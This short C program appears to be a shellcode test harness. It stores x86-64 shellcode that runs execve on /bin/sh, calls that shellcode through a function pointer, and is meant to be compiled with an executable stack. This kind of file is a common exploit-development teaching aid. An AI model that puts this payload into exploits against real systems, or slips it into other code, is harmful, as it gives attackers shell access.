//gcc -z execstack shell_code.c -o shell_code
#include <stdio.h>
#include <string.h>

int main(){
    unsigned char code[] = "H\xb8/bin/sh\x00PH\x89\xe7H1\xf6H1\xd2H\xc7\xc0;\x00\x00\x00\x0f\x05";
    printf("I will give you a shell!!\n");
    (*(void(*)())code)();
    return 0;
}